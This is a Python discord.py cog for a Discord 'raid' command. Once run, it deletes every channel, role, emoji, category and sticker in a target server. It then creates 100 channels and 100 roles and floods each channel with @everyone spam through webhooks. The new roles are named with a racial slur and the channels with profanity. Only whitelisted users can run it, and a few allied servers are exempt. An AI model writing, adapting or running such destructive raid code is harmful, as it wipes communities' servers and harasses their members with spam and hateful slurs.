import discord
from discord.ext import commands
import asyncio
from typing import List

# -----------------------------
# CONFIGURATION (use your values)
# -----------------------------
ALLOWED_USERS: List[int] = [
    1402431821534330911,
    1167531276467708055,
    1115297901829181440,
]

BLOCKED_GUILDS: List[int] = [
    1363562800793915583,
    1191341745204629535,
    1384136902168285218,
    1331286968386060328,
    1284542162574377032,
]

NEW_CHANNEL_NAME = "R A I D E D B I T C H"          # Name for new channels
NEW_ROLE_NAME = "GET FUCKED NIGGER"                # Name for new roles
NUM_TO_CREATE = 100                   # Number of channels and roles to create
NUM_MESSAGES = 25                     # Number of messages per channel
MESSAGE_CONTENT = "@everyone GET CLAPPED LMAO 🤣😂😂🤣😂😂🤣😂🤣🤣😂😂🤣😂🙏🙏🙏🙏"
MESSAGE_DELAY = 0.5                 # Delay (seconds) between messages sent by webhook
ACTION_DELAY = 1.0                    # Delay (seconds) between create/delete actions

# -----------------------------
# COG
# -----------------------------
class WipeAndRebuild(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(name="whipall")
    async def whip_all(self, ctx: commands.Context, guild_id: int):
        """Wipes a target server and creates new channels/roles/messages using webhooks (restricted)."""
        # Permission check
        if ctx.author.id not in ALLOWED_USERS:
            await ctx.send("❌ You are not allowed to use this command.")
            return

        # Guild check
        guild = self.bot.get_guild(guild_id)
        if not guild:
            await ctx.send("❌ I am not in that server or the ID is invalid.")
            return

        if guild.id in BLOCKED_GUILDS:
            await ctx.send("❌ This server is protected. You cannot use this command here.")
            return

        # Confirmation
        await ctx.send(f"⚠️ Are you sure you want to wipe **{guild.name}**? Type `CONFIRM` to continue.")

        def check(m: discord.Message):
            return m.author == ctx.author and m.content == "CONFIRM"

        try:
            await self.bot.wait_for("message", check=check, timeout=30)
        except asyncio.TimeoutError:
            await ctx.send("⏳ Wipe cancelled (no confirmation).")
            return

        # Begin wipe
        await ctx.send("🧹 Starting wipe. This may take a while — I'm skipping anything I can't remove.")

        # Delete channels
        for channel in list(guild.channels):
            try:
                await channel.delete()
                await asyncio.sleep(ACTION_DELAY)
            except Exception:
                # skip any channel we cannot delete
                continue

        # Delete roles (skip @everyone)
        for role in list(guild.roles):
            try:
                if role.is_default():
                    continue
                await role.delete()
                await asyncio.sleep(ACTION_DELAY)
            except Exception:
                continue

        # Delete emojis
        for emoji in list(guild.emojis):
            try:
                await emoji.delete()
                await asyncio.sleep(ACTION_DELAY)
            except Exception:
                continue

        # Delete categories (usually already covered by channel deletion, but keep for completeness)
        for category in list(guild.categories):
            try:
                await category.delete()
                await asyncio.sleep(ACTION_DELAY)
            except Exception:
                continue

        # Delete stickers
        try:
            stickers = await guild.fetch_stickers()
            for sticker in stickers:
                try:
                    await sticker.delete()
                    await asyncio.sleep(ACTION_DELAY)
                except Exception:
                    continue
        except Exception:
            # fetch_stickers may fail depending on permissions/discord version
            pass

        # Rebuild
        await ctx.send("🛠️ Wipe complete (as much as possible). Rebuilding channels and roles...")

        created_channels = []

        # Create text channels
        for i in range(NUM_TO_CREATE):
            try:
                # Optionally make sequential names for easier editing: f"{NEW_CHANNEL_NAME}-{i+1}"
                channel = await guild.create_text_channel(NEW_CHANNEL_NAME)
                created_channels.append(channel)
                await asyncio.sleep(ACTION_DELAY)
            except Exception:
                continue

        # Create roles
        for i in range(NUM_TO_CREATE):
            try:
                # Optionally name them with index: f"{NEW_ROLE_NAME}-{i+1}"
                await guild.create_role(name=NEW_ROLE_NAME)
                await asyncio.sleep(ACTION_DELAY)
            except Exception:
                continue

        # In each created channel, create a webhook, use it to send messages, then delete webhook
        for channel in created_channels:
            # Skip channels we cannot create webhooks in
            try:
                webhook = await channel.create_webhook(name="rebuild-webhook")
            except Exception:
                # cannot create webhook here, skip sending messages
                continue

            # Send messages through the webhook
            for _ in range(NUM_MESSAGES):
                try:
                    # Using wait=True will wait for the request to complete and helps with ordering
                    await webhook.send(content=MESSAGE_CONTENT, wait=True)
                    await asyncio.sleep(MESSAGE_DELAY)
                except Exception:
                    # if sending fails, continue to next message
                    continue

            # Delete the webhook to avoid leaving many webhooks
            try:
                await webhook.delete()
                await asyncio.sleep(ACTION_DELAY)
            except Exception:
                # if can't delete webhook, silently continue
                continue

        # Ensure there's at least one channel (in case create failed earlier)
        if not created_channels:
            try:
                await guild.create_text_channel("general")
            except Exception:
                pass

        await ctx.send(
            f"✅ Rebuild complete! Attempted to create {NUM_TO_CREATE} channels and roles, "
            f"and sent up to {NUM_MESSAGES} messages per created channel via webhooks."
        )

# Setup
async def setup(bot: commands.Bot):
    await bot.add_cog(WipeAndRebuild(bot))